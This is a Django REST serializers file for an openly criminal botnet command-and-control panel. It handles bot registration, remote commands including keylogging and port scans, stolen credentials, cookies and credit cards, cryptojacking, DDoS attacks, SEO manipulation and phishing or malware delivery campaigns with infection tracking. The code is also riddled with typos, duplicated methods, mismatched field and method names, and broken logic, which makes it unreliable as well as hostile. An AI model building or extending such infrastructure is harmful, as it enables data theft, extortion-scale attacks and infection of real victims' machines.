from rest_framework import serializers

from django.utils import timezone
from datetime import timedelta

from .models import (
    Bot, Command, ExfiltratedData, MiningOperation, DDOSAttack,
    SEOCampaign, DeliveryCampaign
)

import humanize

class BotRegistrationSerializer(serializers.ModelSerializer):
    bot_id = serializers.CharField(max_length=100, required=True)
    ip_address = serializers.IPAddressField(required=True)
    hostname = serializers.CharField(max_length=255, required=True)
    platform = serializers.ChoiceField(choices=Bot.PLATFORM_CHOICES, required=True)

    class Meta: 
        model = Bot
        fields = [
            'bot_id', 'bot_type', 'ip_address', 'hostname', 'platform',
            'architecture', 'username', 'priveledges' 'version' ,
            'cpu_cores', 'memory_size', 'can_mine', 'can_ddos', 
            'can_seo', 'can_collect_data', 'meatadata'
        ]

    def validate_bot_id(self, value):
        '''validate bot id format'''
        if len(value) < 5:
            raise serializers.ValidationError("Bot ID must be atleast 5 charactersd long")
        return value
    
    def validate_metadata(self, value):
        '''validate metadata is a dictionary'''
        if not isinstance(value, dict):
            raise serializers.ValidationError("Metadata must be a dictionary")
        return value

class BotSerializer(serializers.ModelSerializer):
    online_status = serializers.SerializerMethodField()
    uptime = serializers.SerializerMethodField()
    last_seen_humanized = serializers.SerializerMethodField()
    capabilities = serializers.SerializerMethodField()
    system_summary = serializers.SerializerMethodField()

    class Meta:    
        model = Bot
        fields = [
            'id', 'bot_id' ,'bot_type', 'ip_address', 'hostname', 'platform',
            'architecture', 'username', 'priveleges', 'status', 'version', 
            'last_seen', 'first_seen', 'cpu_cores', 'memory_size', 'disk_space', 
            'internal_ip', 'mac_address', 'user_agent', 'can_mine', 'can_ddos',
            'can_seo', 'can_collect_data', 'metadata', 'online_status', 'uptime', 
            'last_seen_humanized', 'capabilities', 'system_summary',
        ]
        read_only_fields = ['id', 'first_seen', 'last_seen']

    def get_uptime(self, obj):
        '''Determine if the bot is currently online'''
        time_diff = timezone.now() - obj.last_seen
        return "Online" if time_diff < timedelta(minutes=5) else 'Offline'

    def get_uptime(self, obj):
        '''calculate the bot uptime'''
        uptime = timezone.now() - obj.first_seen
        return humanize.naturaltime(uptime)
    
    def last_seen_humanized(self, obj):
        '''Humanazing last seen'''
        return humanize.naturaltime(obj.last_seen)
    
    def get_capabilities(self, obj):
        '''Get bot capabilites list'''
        capabilities = []
        if obj.can_mine:
            capabilities.append('Cryptocurrency Mining')
        if obj.can_ddos:
            capabilities.append('DDoS Attacks')
        if obj.can_seo:
            capabilities.append('SEO Manipulation')
        if obj.can_collect_data:
            capabilities.append('Data Collection')

        return capabilities
    
    def get_system_summary(self, obj):
        '''Get system summary'''
        memory_gb = obj.memory_size / (1024**3) if obj.memory_size else 0
        disk_gb = obj.disk_space / (1024**3) if obj.disk_space else 0

        return {
            'cpu_cores': obj.cpu_cores,
            'memory_gb': round(memory_gb, 1),
            'disk_gb': round(disk_gb, 1),
            'architecture': obj.architecture,
            'priveleges': obj.priveleges,
        }

class CommandExecutionSerializer(serializers.Serializer):
    output = serializers.CharField(required=False, allow_blank=True)
    error = serializers.CharField(required=False, allow_blank=True)
    exit_code = serializers.IntegerField(required=False, default=0)
    execution_time = serializers.FloatField(required=False, default=0.0)
    
    def validate_exit_code(self, value):
        '''Validating exit code is within reasonable range'''
        if not (-1 <= value <= 255):
            raise serializers.ValidationError("Exit code must be between -1 and 255")
        return value

class CommandSerializer(serializers.ModelSerializer):
    bot_info = serializers.SerializerMethodField()
    execution_time = serializers.SerializerMethodField()
    status_display = serializers.SerializerMethodField()
    parameters_preview = serializers.SerializerMethodField()
    output_preview = serializers.SerializerMethodField()

    class Meta:
        model = Command
        fields = [
            'id', 'bot', 'bot_info', 'command_type', 'command_name', 'parameters', 
            'status', 'status_display', 'created_at', 'executed_at', 'completed_at',
            'output', 'output_preview', 'error', 'exit_code', 'execution_time', 
            'parameters_preview', 'encrypted_output'    
        ]
        read_only_fields = ['id', 'created_at', 'executed_at', 'completed_at']

    def get_bot_info(self, obj):
        '''Get bot info'''
        return {
            'bot_id': obj.bot.bot_id,
            'host_name': obj.bot.hostname,
            'platform': obj.bot.platform,
            'ip_address': obj.bot.ip_address,
        }
    
    def get_execution_time(self, obj):
        '''Calculating execution time'''
        if obj.executed_at and obj.completed_at:
            return (obj.compeleted_at - obj.executed_at).total_seconds()
        elif obj.executed_at:
            return (timezone.now() - obj.executed_at).total_seconds()
        return None

    def get_display_status(self, obj):
        '''Get human readable status'''
        status_map = {
            'pending': 'Pending Execution',
            'executing': 'Executing',
            'completed': 'Completed Successfully',
            'failed': 'Execution Failed',
            'timeout': 'Execution Timed Out',
        }

        return status_map.get(obj.status, obj.status)

    def get_parameters_preview(self, obj):
        '''Get parameters Preview'''
        if obj.parameters:
            params_str = str(obj.parameters)
            return params_str[:100] + '...' if len(params_str) > 100 else params_str
        return "No output"
    
    def validate_parameters(self, value):
        '''Validate parameters are a dictionary'''
        if not isinstance(value, dict):
            raise serializers.ValidationError("Parameters must be a JSON object")
        return value
    
    def create(self, validated_data):
        '''Create command with validation'''
        bot = validated_data.get('bot')
        command_type = validated_data.get('command_type')

        #validate bot capabilities for specific command types
        if command_type == 'mine' and not bot.can_mine:
            raise serializers.ValidationError("Bot does not support mining operations")
        elif command_type == 'ddos' and not bot.can_ddos:
            raise serializers.ValidationError("Bot does not support DDoS operations")
        elif command_type == 'seo' and not bot.can_seo:
            raise serializers.ValidationError("Bot does not support SEO operations")

        return super().create(validated_data)

class ExfiltratedDataSerializer(serializers.ModelSerializer):
    bot_info = serializers.SerializerMethodField()
    data_size_humanized = serializers.SerializerMethodField()
    data_type_display = serializers.SerializerMethodField()
    crated_at_humanized = serializers.SerializerMethodField()
    download_url = serializers.SerializerMethodField()

    class Meta:
        model = ExfiltratedData
        fields = [
            'id', 'bot', 'bot_info', 'data_type', 'data_type_display', 'filename',
            'descripiton', 'raw_data', 'encrypted_data', 'data_size', 'data_size_humanized',
            'created_at', 'created_at_humanized', 'checksum', 'download_url'
        ]
        read_only_fields = ['id', 'created_at', 'checksum']
    
    def get_bot_info(self, obj):
        '''Get bot information'''
        return {
            'bot_id': obj.bot.bot_id,
            'hostname': obj.bot.hostname,
            'platform': obj.bot.platform,
        }

    def get_data_size_humanized(self, obj):
        '''Humanize data size'''
        return humanize.naturalsize(obj.data_size) if obj.data_size else '0 bytes'

    def get_data_type_display(self, obj):
        '''Get human readable data type'''
        type_map = {
            'file': 'File',
            'credentials': 'Credentials',
            'network': 'Network Information',
            'system': 'System Information',
            'browser': 'Browser',
            'keylogger': 'Keylogger Data',
            'cookies': 'Bowser Data',
            'credit_cards': 'Credit Card Information',
            'passwords': 'Saved Passwords',
        }

    def get_created_at_humanized(self, obj):
        '''Humanize created at timestamp'''
        return humanize.naturaltime(obj.created_at)

    def get_download_url(self, obj):
        '''Generate download url'''
        return f'/api/data/{obj.id}/download/'

    def validated_data_type(self, value):
        '''Validate data type'''
        valid_types = [choice[0] for choice in ExfiltratedData.DATA_TYPE_CHOICES]
        if value not in valid_types:
            raise serializers.ValidationError(f"Invalid data type. Must be one of: {valid_types}")
        return value

class MiningOperationSerializer(serializers.ModelSerializer):
    bot_info = serializers.SerializerMethodField()
    duration = serializers.SerializerMethodField()
    status = serializers.SerializerMethodField()
    efficiency = serializers.SerializerMethodField()

    class Meta: 
        model = MiningOperation
        fields = [
            'id', 'bot', 'bot_info', 'algorithm', 'intensity', 'hashes_per_second',
            'start_time', 'end_time', 'is_active', 'duration', 'status', 'efficiency',
        ]
        read_only_fields = ['id', 'start_time']
    
    def get_bot_info(self, obj):
        '''Get bot information'''
        return {
            'bot_id': obj.bot.bot_id,
            'hostname': obj.bot.hostname,
            'platform': obj.bot.platform,
            'cpu_cores': obj.bot.cpu_cores,
        }

    def get_duration(self, obj):
        '''Calculate operation duration'''
        if obj.end_time:
            duration = obj.end_time = obj.start_time
        else: 
            duration = timezone.now() - obj.start_time
        return humanize.naturaldelta(duration)
    
    def get_status(self, obj):
        '''Operation status'''
        return 'Active' if obj.is_active else 'Completed'
        
    def get_efficency(self, obj):
        '''Calculate mining efficiency'''
        if obj.hashes_per_second > 2 and obj.bot.cpu_cores > 0:
            efficiency = obj.hashes_per_count / obj.bot.cpu_cores
            return round(efficiency, 2)
        return 0.0

    def validate_intensity(self, value):
        '''validating mining intensity'''
        if not (1 <= value <= 100):
            raise serializers.ValidationError("Intensity must be between 1 and 100")
        return value
    
    def validate_algorithm(self, value):
        '''Validating mining algorithm'''
        valid_algorithms = [
            'cryptonight', 'sha256', 'scrypt', 'ethash', 'randomx'
        ]
        if value not in valid_algorithms:
            raise serializers.ValidationError(f"Invalid algorithm .Must be one of: {valid_algorithms}")
        return value

class DDOSAttackSerializer(serializers.ModelSerializer):
    bot_info = serializers.SerializerMethodField()
    duration_remaining = serializers.SerializerMethodField()
    status = serializers.SerializerMethodField()
    requests_per_second = serializers.SerializerMethodField()
    target_domain = serializers.SerializerMethodField()

    class Meta:
        model = DDOSAttack
        fields = [
            'id', 'bot', 'bot_info', 'target_url', 'target_domain', 'duration',
            'requests_sent', 'start_time', 'end_time', 'is_active', 'duration_remaining',
            'status', 'requests_per_second'
        ]
        read_only_fields = ['id', 'start_time', 'requests_sent']

    def get_bot_info(self, obj):
        '''Get bot information'''
        return {
            'bot_id': obj.bot.bot_id,
            'hostname': obj.bot.hostname,
            'platform': obj.bot.platform,
            'ip_address': obj.bot.ip_address,
        }

    def get_duration_remaining(self, obj):
        '''calculating remaining attack duration'''
        if obj.is_active:
            elapsed = timezone.now() - obj.start_time
            remaining = obj.duration - elapsed.total_seconds()
            return max(0, round(remaining))
        return 0
    
    def get_status(self, obj):
        '''Get attack status'''
        return "Active" if obj.is_active else "Completed"
    
    def get_requests_per_second(self, obj):
        '''calculate requests per second'''
        if obj.is_active:
            elapsed = (timezone.now() - obj.start_time).total_seconds()
            if elapsed > 0:
                return round(obj.requests_sent / elapsed, 2)
        return 0.0
    
    def get_target_domain(self, obj):
        '''Extract target domain from url'''
        from urllib.parse import urlparse
        try:
            parsed = urlparse(obj.target_url)
            return parsed.netloc
        except:
            return "Invalid URL"
    
    def validate_duration(self, value):
        '''Validating attacking duration'''
        if not (1 <= value <= 3600): # 1 second to one hour
            raise serializers.ValidationError("Duration must be between 1 and 3600 seconds")
        return value

    def validate_target_url(self, value):
        '''valdating target url'''
        from urllib.parse import urlparse
        parsed = urlparse(value)
        if not parsed.scheme or not parsed.netloc:
            raise serializers.ValidationError("Invalid target url")
        return value
    
class SEOCampaignSerializer(serializers.ModelSerializer):
    duration = serializers.SerializerMethodField()
    status = serializers.SerializerMethodField()
    success_rate = serializers.SerializerMethodField()
    searches_per_bot = serializers.SerializerMethodField()

    class Meta:
        model = SEOCampaign
        fields = [
            'id', 'name', 'keyword', 'bots_assigned', 'searches_performed',
            'start_time', 'end_time', 'is_active', 'duration', 'status', 
            'success_rate', 'searches_per_bot'
        ]
        read_only_fields = ['id', 'start_time']

    def get_duration(self, obj):
        '''calculate campaign duration'''
        if obj.end_time:
            duration = obj.end_time - obj.start_time
        else:
            duration = timezone.now() - obj.start_time
        return humanize.naturaldelta(duration)

    def get_status(self, obj):
        '''Get campaign status'''
        return "Active" if obj.is_active else "Completed"

    def get_success_rate(self, obj):
        '''Calculating success rate'''
        if obj.bots_assigned > 0 and obj.searches_performed > 0:
            #simulating success rate calculation -> to give actual searches ber bot
            expected_searches = obj.bots_assigned * 100 # assuming 100 searches per bot
            success_rate = min(100, (obj.searches_performed / expected_searches) * 100)
            return round(success_rate, 1)
        return 0
    
    def validate_name(self, value):
        '''Validating Campaign name'''
        if SEOCampaign.objects.filter(name=value).exists():
            raise serializers.ValidationError("A campaign with this name already exists")
        return value
    
    def validate_keyword(self, value):
        '''validate keyword'''
        if len(value) < 2:
            raise serializers.ValidationError("Keyword must be atleast 2 characters")
        return value
    
class DeliveryCampaignSerializer(serializers.ModelSerializer):
    infection_rate = serializers.SerializerMethodField()
    status = serializers.SerializerMethodField()
    duration = serializers.SerializerMethodField()
    payload_type_display = serializers.SerializerMethodField()
    delivery_method_display = serializers.SerializerMethodField()
    
    class Meta:
        model = DeliveryCampaign
        fields = [
            'id', 'name', 'delivery_method', 'delivery_method_display', 'target_url',
            'payload_type', 'payload_type_display', 'infections', 'created_at', 
            'is_active', 'infection_rate', 'status', 'duration'
        ]
        read_only_fields = ['id', 'created_at', 'infections']
    
    def get_infection_rate(self, obj):
        '''Calculate infection rate'''
        #Typically should compare infections to delivery attempts, follows a simulated rate
        if obj.infections > 0:
            return f"{(obj.infections / (obj.infections + 10)) * 100:.1f}%" #simulated
        return "0%"

    def get_status(self, obj):
        """Get campaign status"""
        return "Active" if obj.is_active else "Completed"
    
    def get_duration(self, obj):
        '''Calculate campaign duration'''
        duration = timezone.now() - obj.created_at
        return humanize.naturaldelta(duration)

    def get_payload_type_display(self, obj):
        '''Get human readable payload type'''
        type_map = {
            'javascript': 'Javascript Bot',
            'python': 'Python Script',
            'executable': 'Windows Executable',
            'mobile': 'Mobile Application',
        }
        return type_map.get(obj.payload_type, obj.payload_type)

    def get_delivery_method_display(self, obj):
        '''Get human-readable delivery method'''
        method_map = {
            'web': 'Web Delivery',
            'email': 'Email Phishing',
            'social': 'Social Media',
            'malware': 'Malware Distribution',
        }
        return method_map.get(obj.delivery_method, obj.delivery_method)
    
    def validate_name(self, value):
        '''Validate name'''
        if len(value) < 3:
            raise serializers.ValidationError("Campaign name must be atleast 3 character long")
        return value
    
class DashboardStatsSerializer(serializers.Serializer):
    #Bot statistics
    total_bots = serializers.IntegerField()
    online_bots = serializers.IntegerField()
    windows_bots = serializers.IntegerField()
    linux_bots = serializers.IntegerField()
    web_bots = serializers.IntegerField()
    mobile_bots = serializers.IntegerField()

    #command statistics
    total_commands = serializers.IntegerField()
    pending_commands = serializers.IntegerField()
    executing_commands = serializers.IntegerField()
    completed_commands = serializers.IntegerField()

    #Mining Stastics
    active_mining_operations = serializers.IntegerField()
    mining_bots_count = serializers.IntegerField()

    #DDoS statistics
    active_ddos_attacks = serializers.IntegerField()
    total_ddos_requests = serializers.IntegerField()

    #SEO statistics
    active_seo_campaigns = serializers.IntegerField()
    total_seo_searches = serializers.IntegerField()

    #Recent activity
    recent_commands = CommandSerializer(many=True)
    recent_data = ExfiltratedDataSerializer(many=True)

class BotCommandSerializer(serializers.Serializer):
    command_name = serializers.CharField(max_length=100, required=True)
    command_type = serializers.ChoiceField(choices=Command.TYPE_CHOICES, required=True)
    parameters = serializers.JSONField(required=False, default=dict)

    def validate_command_name(self, value):
        '''Validate command name'''
        valid_commands = [
            'system_info' ,'file_list', 'port_scan', 'screenshot',
            'keylogger_start', 'start_mining', 'start_ddos', 'boost_seo'
        ]
        if value not in valid_commands:
            raise serializers.ValidationError(f"Invalid command. Must be one of : {valid_commands}")
        
        return value
    
class MiningStartSerializer(serializers.Serializer):
    bot_id = serializers.CharField(max_length=100, required=True)
    algorithm = serializers.CharField(max_length=50, default='cryptonight')
    intensity= serializers.IntegerField(default=50, min_value=1 ,max_value =100)

    def validate_bot_id(self, value):
        '''Validate bot exists and supports mining'''
        try:
            bot = Bot.objects.get(bot_id=value)
            if not bot.can_mine:
                raise serializers.ValidationError('Bot does not support mining operations')
        except Bot.DoesNotExist:
            raise serializers.ValidationError("Bot not found")
        return value

class DDOSStartSerializer(serializers.Serializer):
    bot_id  = serializers.CharField(max_length=100 ,required=True)
    target_url = serializers.URLField(required=True)
    duration = serializers.IntegerField(default=60, min_value=1, max_value=3600)
    threads = serializers.IntegerField(default=10, min_value=1, max_value=100)

    def validate_bot_id(self, value):
        '''validate bot exists and supports ddos'''
        try:
            bot = Bot.objects.get(bot_id=value)
            if not bot.can_ddos:
                raise serializers.ValidationError("Bote does  not support ddos operations")
        except Bot.DoesNotExist:
            raise serializers.ValidationError("Bot bot found")
        return value
    
class SEOStartSerializer(serializers.Serializer):
    campaign_name = serializers.CharField(max_length=100, required=True)
    keyword = serializers.CharField(max_length=255, required=True)
    bots_count = serializers.IntegerField(default=10, min_value=1, max_value=1000)
    duration_hours = serializers.IntegerField(default=24, min_value=1, max_value=720)

class WebDeliverySerializer(serializers.Serializer):
    name = serializers.CharField(max_length=100, required=True)
    target_url = serializers.URLField(required=True)
    payload_type = serializers.ChoiceField(required=False, choices=[
        ('javascript', 'JavaScript'),
        ('python', 'Python'),
        ('executable', 'Executable'),
    ], default='javascript')
